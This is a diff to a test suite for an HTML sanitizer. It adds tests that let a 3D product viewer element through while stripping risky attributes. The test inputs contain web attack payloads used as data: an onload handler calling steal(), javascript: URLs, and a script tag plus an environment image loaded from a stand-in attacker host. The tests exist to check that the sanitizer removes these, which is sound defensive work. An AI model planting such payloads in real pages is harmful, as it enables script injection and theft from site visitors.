@@ -192,10 +192,62 @@ describe('sanitizeHtml — forms survive, attack surface stays closed (114 §3.9
 
 describe('sanitize contract', () => {
 	it('exposes a versioned allowlist for stale-copy detection', () => {
-		expect(SANITIZE_VERSION).toBe(4); // v4 adds the internal-origin link rewrite.
+		expect(SANITIZE_VERSION).toBe(5); // v5 keeps <model-viewer> (3D product viewer).
 		expect(SANITIZE_OPTIONS.allowedTags).toContain('figure');
 		expect(SANITIZE_OPTIONS.allowedTags).toContain('form');
+		expect(SANITIZE_OPTIONS.allowedTags).toContain('model-viewer');
 		expect(SANITIZE_OPTIONS.allowedTags).not.toContain('script');
+	});
+});
+
+describe('sanitizeHtml — 3D product viewer (v5)', () => {
+	// `disallowedTagsMode: 'discard'` means an unlisted element is DROPPED, so
+	// before v5 an authored 3D model disappeared from the rebuild silently.
+	it('keeps the model-viewer element and its data contract', () => {
+		const out = sanitizeHtml(
+			'<figure class="media"><model-viewer src="/models/sofa.glb" poster="/models/sofa.svg" ' +
+				'alt="Aurora sofa" camera-controls touch-action="pan-y" auto-rotate ar ar-modes="webxr"></model-viewer></figure>'
+		);
+
+		expect(out).toContain('<model-viewer');
+		expect(out).toContain('src="/models/sofa.glb"');
+		expect(out).toContain('poster="/models/sofa.svg"');
+		expect(out).toContain('alt="Aurora sofa"');
+		expect(out).toContain('camera-controls');
+		expect(out).toContain('touch-action="pan-y"');
+	});
+
+	it('strips the fetch surface and every event handler from the viewer', () => {
+		// `environment-image` would let content pull a third-party HDR; the CMS
+		// must not own that fetch decision.
+		const out = sanitizeHtml(
+			'<model-viewer src="/models/sofa.glb" environment-image="https://evil.test/h.hdr" ' +
+				'onload="steal()" style="position:fixed" with-credentials></model-viewer>'
+		);
+
+		expect(out).toContain('<model-viewer');
+		expect(out).not.toContain('environment-image');
+		expect(out).not.toContain('evil.test');
+		expect(out).not.toContain('onload');
+		expect(out).not.toContain('style=');
+		expect(out).not.toContain('with-credentials');
+	});
+
+	it('drops a javascript: model or poster URL', () => {
+		const out = sanitizeHtml('<model-viewer src="javascript:alert(1)" poster="javascript:alert(2)"></model-viewer>');
+		expect(out).not.toContain('javascript:');
+	});
+
+	it('still refuses to ship the runtime script from content', () => {
+		// The web component is registered by the generated project, never by an
+		// author — content can place a viewer but cannot load code.
+		const out = sanitizeHtml(
+			'<model-viewer src="/models/sofa.glb"></model-viewer>' +
+				'<script type="module" src="https://evil.test/model-viewer.js"></script>'
+		);
+		expect(out).toContain('<model-viewer');
+		expect(out).not.toContain('script');
+		expect(out).not.toContain('evil.test');
 	});
 });
 
